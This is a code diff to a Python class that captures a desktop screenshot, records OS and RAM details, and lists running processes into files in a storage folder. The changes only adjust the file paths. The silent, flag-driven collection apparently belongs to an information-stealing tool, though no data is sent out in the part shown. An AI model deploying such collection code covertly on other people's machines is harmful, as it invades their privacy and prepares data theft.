@@ -1,5 +1,6 @@
 from mss import mss
 from os import mkdir
+
 from win32com.client import GetObject
 from win32api import EnumDisplayMonitors, GetMonitorInfo
 from urllib.request import Request, urlopen
@@ -19,14 +20,14 @@ class System:
     def __create_folder(self):
 
         if any(self.statuses):
-            mkdir(rf"{self.storage_path}\{self.storage_folder}\{self.folder}")
+            mkdir(rf"{self.storage_path}\{self.folder}")
 
     def __create_screen(self):
 
         if self.statuses[0] is True:
 
             with mss() as screen:
-                screen.shot(mon=-1, output=rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Screenshot.png")
+                screen.shot(mon=-1, output=rf"{self.storage_path}\{self.folder}\Screenshot.png")
 
     def __get_system_info(self):
 
@@ -55,7 +56,7 @@ class System:
                 f"RAM: {round(float(os_info.TotalVisibleMemorySize) / 1048576)} GB\n",
             )
 
-            with open(rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Configuration.txt", "a", encoding="utf-8") as system:
+            with open(rf"{self.storage_path}\{self.folder}\Configuration.txt", "a", encoding="utf-8") as system:
 
                 for item in info:
                     system.write(item)
@@ -66,7 +67,7 @@ class System:
 
         if self.statuses[2] is True:
 
-            with open(rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Processes.txt", "a", encoding="utf-8") as processes:
+            with open(rf"{self.storage_path}\{self.folder}\Processes.txt", "a", encoding="utf-8") as processes:
 
                 result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
                 processes.write("\n".join(process for process in result))
